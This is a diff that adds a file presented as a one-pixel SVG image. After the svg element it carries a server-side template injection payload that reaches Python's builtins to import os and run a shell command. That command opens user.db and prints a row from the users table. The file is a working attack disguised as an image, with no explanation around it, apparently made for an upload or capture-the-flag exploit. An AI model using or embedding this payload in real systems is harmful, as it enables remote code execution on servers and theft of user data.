@@ -1,0 +1,4 @@
+<?xml version="1.0" encoding="UTF-8"?><svg xmlns="http://www.w3.org/2000/svg" width="1" height="1"/>
+<text>{{ self.__init__.__globals__.__builtins__.__import__('os').popen("python -c 'import sqlite3;con = "+'sqlite3.connect("user.db");cur = con.cursor();print(cur.execute("SELECT * FROM users").fetchone())'+"'").read() }}</text>
+
+
